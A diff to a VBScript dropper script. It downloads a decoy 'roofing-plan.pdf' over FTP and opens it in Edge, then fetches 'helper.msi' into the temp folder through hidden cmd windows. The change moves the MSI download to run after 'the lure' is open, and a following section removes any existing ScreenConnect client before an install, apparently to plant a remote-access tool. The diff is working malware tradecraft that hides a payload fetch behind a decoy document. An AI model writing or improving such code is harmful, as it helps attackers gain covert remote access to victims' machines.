@@ -24,9 +24,6 @@ tempDir = oSh.ExpandEnvironmentStrings("%TEMP%")
 ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & here & "\roofing-plan.pdf"" ftp://" & h & "/roofing-plan.pdf"
 ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
 Log "[vbs] pdf dl rc=" & ftpRc
-ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\helper.msi"" ftp://" & h & "/helper.msi"
-ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
-Log "[vbs] msi dl rc=" & ftpRc
 
 ' --- Open PDF in Edge (if downloaded) ---
 p = here & "\roofing-plan.pdf"
@@ -43,6 +40,11 @@ If oFs.FileExists(p) Then
 Else
     Log "[vbs] pdf missing"
 End If
+
+' --- Fetch helper.msi while the lure is already open ---
+ftpCmd = "curl.exe -s --fail -u anonymous:ftp@example.com -o """ & tempDir & "\helper.msi"" ftp://" & h & "/helper.msi"
+ftpRc = oSh.Run("cmd.exe /c " & ftpCmd, 0, True)
+Log "[vbs] msi dl rc=" & ftpRc
 
 ' --- Sweep any existing ScreenConnect client before install ---
 Log "[vbs] sweep start"
